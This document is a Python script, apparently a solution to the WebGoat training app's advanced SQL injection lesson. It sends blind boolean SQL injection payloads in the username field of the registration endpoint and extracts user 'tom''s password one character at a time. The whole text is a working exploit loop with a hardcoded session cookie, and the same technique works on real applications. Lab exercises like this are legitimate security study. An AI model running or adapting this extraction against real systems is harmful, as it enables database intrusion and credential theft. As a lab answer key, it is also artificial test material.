# python-scripts-tom

```python

import requests
import urllib.parse

def main():
    url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/register"
    session_id = '11D62F99B3EA8B8FC25CD2F86BBBF793'

    headers = {
        "Cookie": f"JSESSIONID={session_id}",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc?username=webgoat",
        "Origin": "http://127.0.0.1:8080",
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest"
    }

    password = ""
    max_length = 25

    print("[*] Starting password extraction for user 'tom'...")

    for i in range(1, max_length + 1):
        found = False
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            payload = f"tom' AND substring(password,{1},{i}) = '{password + char}' --"
            data = {
                "username_reg": payload,
                "email_reg": "test@test.com",
                "password_reg": "pass",
                "confirm_password_reg": "pass"
            }
            encoded_data = urllib.parse.urlencode(data)

            response = requests.put(url, headers=headers, data=encoded_data)
            
            if "already exists" in response.text:
                password += char
                print(f"[+] Found character: {char} --> {password}")
                found = True
                break
            # else:
            #     print(response.text)
                


        if not found:
            print("[!] No more characters matched. Ending...")
            break

    print("\n[*] Final password for user 'tom':", password)

if __name__ == "__main__":
    main()

```
